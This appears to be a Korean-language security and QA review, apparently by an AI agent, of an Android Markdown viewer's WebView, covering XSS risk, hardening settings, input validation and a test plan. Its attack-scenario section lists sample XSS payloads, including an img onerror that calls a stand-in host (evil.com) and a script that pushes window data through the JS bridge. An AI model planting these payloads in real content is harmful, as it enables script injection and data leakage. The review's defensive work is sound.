# 보안 및 QA 리뷰 — Android Markdown Viewer + Mermaid
- 리뷰어: Security/QA Agent (보안 엔지니어 + QA 전문가 관점)
- 일자: 2026-01-27

---

## 1. WebView 보안 평가

### 1.1 치명적 취약점: XSS via `__MARKDOWN_HTML__`

**문제**: Markdown→HTML 변환 결과를 문자열 치환으로 템플릿에 삽입하면, 악성 Markdown의 `<script>` 태그나 이벤트 핸들러가 그대로 실행됨.

**공격 시나리오**:
```markdown
# 정상처럼 보이는 문서
<script>Android.onMermaidError(JSON.stringify(window))</script>
<img src=x onerror="fetch('https://evil.com')">
[Click](javascript:alert('XSS'))
```

**해결 방안**:
1. OWASP Java HTML Sanitizer 도입
2. CommonMark에서 `escapeHtml(true)` + `sanitizeUrls(true)`
3. CSP 메타 태그 추가:
```html
<meta http-equiv="Content-Security-Policy"
      content="default-src 'none'; script-src 'self' 'unsafe-inline';
               style-src 'self' 'unsafe-inline'; img-src 'self' data:;">
```

### 1.2 WebView 설정 — 추가 권장

현재 설정은 대체로 적절하나 다음을 추가:
- `domStorageEnabled = false`
- `databaseEnabled = false`
- `setGeolocationEnabled(false)`
- `savePassword = false`
- 렌더러 프로세스 격리 (Android 8.0+): `WebView.setDataDirectorySuffix("markdown_viewer")`

---

## 2. JS Interface 평가

### 현재 노출: 최소 (적절)
- `Android.onDiagramClicked(idx)` — 읽기 전용 콜백
- `Android.onMermaidError(msg)` — 에러 보고만

### 필수 보강
```kotlin
@JavascriptInterface
fun onDiagramClicked(idx: Int) {
    if (idx !in 0 until diagramCount) return  // 범위 검증
    handler.post { handleDiagramClick(idx) }  // UI 스레드 전환
}

@JavascriptInterface
fun onMermaidError(msg: String) {
    val sanitized = msg
        .take(1000)                    // 길이 제한 (DoS 방지)
        .replace("\n", "\\n")          // 로그 인젝션 방지
        .replace("\r", "")
    Log.e(TAG, "Mermaid error: $sanitized")
}
```

---

## 3. 테스트 커버리지 평가

### 현재 상태
| 영역 | 커버리지 | 평가 |
|------|:--------:|------|
| 기능 테스트 | 60% | 기본 기능 커버, 엣지 케이스 부족 |
| 보안 테스트 | 10% | XSS/인젝션 테스트 전무 |
| 성능 테스트 | 0% | 대용량 파일, 복잡 다이어그램 미검증 |
| 접근성 테스트 | 0% | TalkBack 등 미검증 |

### 누락된 테스트 시나리오

**보안 (최우선)**:
- XSS via script tag, img onerror, javascript: URL
- Mermaid 다이어그램 내 악성 HTML 삽입
- JS Interface 입력 범위 검증
- 네트워크 차단 검증 (fetch/XHR 시도)
- 로그 인젝션 방지

**엣지 케이스**:
- 빈 파일
- 10MB+ 대용량 파일 (OOM 방지)
- 1000+ 노드의 복잡한 다이어그램
- Mermaid만 있는 문서 (텍스트 없음)
- 깨진 Mermaid 문법
- Unicode/이모지가 포함된 다이어그램 노드

**성능**:
- 100개 다이어그램 렌더링 시간
- 메모리 사용량 피크
- 스크롤 FPS (60fps 유지 여부)

### 추가 회귀 테스트 샘플 권장
- `xss_attempt.md` — XSS 공격 포함 문서
- `large_document.md` — 10MB+ 대용량
- `complex_diagram.md` — 100+ 노드
- `unicode_heavy.md` — 다국어/이모지 집중
- `all_diagram_types.md` — 모든 Mermaid 타입

---

## 4. NFR 검증 방법 제안

| NFR | 목표 | 검증 방법 |
|-----|------|----------|
| NFR-01 오프라인 | 로컬 파일 정상 동작 | 비행기 모드에서 전체 플로우 테스트 |
| NFR-02 외부전송 없음 | 네트워크 요청 0건 | Network Profiler로 확인 |
| NFR-03 안정성 | graceful fallback | 에러 Mermaid 5종 테스트 |
| NFR-04 성능 | p50 TTI 1.5s | 100KB 문서 기준 벤치마크 |
| NFR-05 최소 API | API 28+ | 에뮬레이터 API 28에서 전체 테스트 |

---

## 5. 현재 보안 점수 및 목표

### 현재: 30/100
- 원칙은 좋으나 구현 가이드 부재 (Sanitizer, CSP 등)
- 테스트 전무

### 목표 (즉시 조치 후): 85/100
적용 항목:
1. HTML Sanitization 라이브러리 도입
2. CSP 헤더 적용
3. Markdown 파서 보안 설정
4. JS Interface 입력 검증
5. 보안 테스트 스위트 50개+
6. Mermaid 버전 고정 + 보안 패치 모니터링

---

## 6. 테스트 로드맵

### Phase 1 (보안 기반)
- [ ] XSS 방어 테스트 전체
- [ ] HTML Sanitizer 통합 검증
- [ ] JS Interface 입력 검증
- [ ] 네트워크 차단 검증

### Phase 2 (기능 안정성)
- [ ] 엣지 케이스 테스트
- [ ] 에러 처리 테스트
- [ ] 통합 테스트 (전체 플로우)
- [ ] 회귀 테스트 자동화

### Phase 3 (성능 및 품질)
- [ ] 렌더링 성능 벤치마크
- [ ] 메모리 프로파일링
- [ ] 스트레스 테스트 (1000회 랜덤 조작)
- [ ] 접근성 테스트
